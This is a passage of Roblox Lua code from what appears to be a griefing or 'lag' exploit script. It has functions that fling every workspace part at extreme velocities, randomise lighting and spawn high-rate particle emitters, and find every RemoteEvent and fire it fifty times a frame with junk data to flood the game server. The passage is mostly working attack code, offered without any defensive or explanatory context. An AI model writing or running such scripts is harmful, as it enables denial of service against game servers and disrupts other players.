                part.Parent = Workspace
                Debris:AddItem(part, 0.5)
            end
            task.wait()
        end
    end
    
    local function physicsExplosion()
        while lagActive do
            for _, obj in pairs(Workspace:GetDescendants()) do
                if obj:IsA("BasePart") and obj ~= player.Character then
                    obj.Velocity = Vector3.new(math.random(-5000, 5000), math.random(-5000, 5000), math.random(-5000, 5000))
                    obj.RotVelocity = Vector3.new(math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000))
                end
            end
            task.wait(0.1)
        end
    end
    
    local function remoteSpam()
        local remotes = {}
        for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
            if obj:IsA("RemoteEvent") then
                table.insert(remotes, obj)
            end
        end
        while lagActive do
            for _, remote in pairs(remotes) do
                pcall(function()
                    for i = 1, 50 do
                        remote:FireServer({spam = true, data = HttpService:GenerateGUID(false), time = tick(), random = math.random(1, 999999)})
                    end
                end)
            end
            task.wait()
        end
    end
    
    local function visualLag()
        while lagActive do
            Lighting.Brightness = math.random(0, 2)
            Lighting.ClockTime = math.random(0, 24)
            Lighting.FogEnd = math.random(0, 1000)
            local att = Instance.new("Attachment")
            local pe = Instance.new("ParticleEmitter")
            pe.Rate = 10000
            pe.VelocityInheritance = Vector3.new(100, 100, 100)
            pe.Lifetime = NumberRange.new(0.1)
            pe.Parent = att
            att.Parent = Workspace
            Debris:AddItem(att, 0.05)
            task.wait(0.01)
